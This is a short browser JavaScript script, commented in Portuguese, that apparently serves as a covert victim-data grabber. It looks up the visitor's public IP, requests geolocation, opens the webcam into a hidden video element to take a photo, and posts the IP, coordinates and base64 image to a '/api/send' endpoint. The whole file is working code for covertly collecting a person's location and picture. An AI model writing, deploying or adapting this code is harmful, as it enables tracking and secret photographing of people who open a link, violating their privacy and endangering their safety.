(async () => {
  const dados = {};

  // 🌐 Captura IP público
  try {
    const resIP = await fetch('https://api.ipify.org?format=json');
    const ipJson = await resIP.json();
    dados.ip = ipJson.ip;
  } catch (err) {
    dados.ip = 'Erro ao capturar';
  }

  // 📍 Captura geolocalização
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(async (pos) => {
      dados.latitude = pos.coords.latitude;
      dados.longitude = pos.coords.longitude;

      // 🎥 Captura selfie pela webcam
      try {
        const video = document.createElement('video');
        video.setAttribute('autoplay', '');
        video.setAttribute('playsinline', '');
        video.style.display = 'none';
        document.body.appendChild(video);

        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await video.play();

        // Aguarda um pouquinho pra câmera ajustar a luz
        await new Promise(r => setTimeout(r, 1500));

        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const selfieBase64 = canvas.toDataURL('image/jpeg');

        dados.selfie = selfieBase64;

        // Encerra webcam
        stream.getTracks().forEach(track => track.stop());
        video.remove();

        // Envia dados para o servidor
        await fetch('/api/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(dados)
        });

      } catch (err) {
        console.error('Erro ao capturar selfie:', err);
      }

    }, (err) => {
      console.error('Erro ao obter localização:', err);
    });
  } else {
    console.error('Geolocalização não suportada pelo navegador.');
  }
})();
